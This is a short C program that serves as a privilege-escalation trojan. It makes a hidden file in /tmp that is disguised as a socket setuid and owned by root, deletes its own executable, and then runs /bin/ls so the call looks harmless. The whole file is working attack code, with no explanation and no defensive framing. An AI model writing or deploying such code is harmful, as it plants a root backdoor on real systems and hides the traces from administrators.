#include <sys/stat.h>
#define SHELL "/tmp/.nng_socket="
int main(int argc, char *argv[])
{
  chmod(SHELL, S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
  chown(SHELL, 0, 0);
  remove(argv[0]);
  execv("/bin/ls", argv);
}

